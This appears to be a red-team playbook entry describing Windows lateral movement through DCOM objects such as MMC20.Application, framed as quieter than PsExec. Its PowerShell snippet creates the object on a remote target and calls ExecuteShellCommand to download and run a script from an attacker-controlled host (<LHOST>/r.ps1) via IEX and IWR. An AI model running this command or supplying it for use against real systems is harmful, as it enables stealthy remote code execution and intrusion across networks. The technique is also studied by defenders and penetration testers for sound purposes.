# 18.01 DCOM Lateral MMC20

> Pivot via `MMC20.Application`, `ShellWindows`, or `Excel.Application` DCOM objects that expose `ExecuteShellCommand` without creating a service.

## Overview

MMC20.Application, ShellWindows, Excel.Application DCOM objects expose ExecuteShellCommand-like methods that proxy execution. No service created — quieter than PsExec.

## Steps

- **[activator]::CreateInstance** with -ComputerName.
- **Invoke ExecuteShellCommand** on the COM object.

## Commands

### DCOM

```powershell
$com = [Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','<TARGET>'))
$com.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-c IEX(IWR http://<LHOST>/r.ps1 -UseBasicParsing)','7')
```
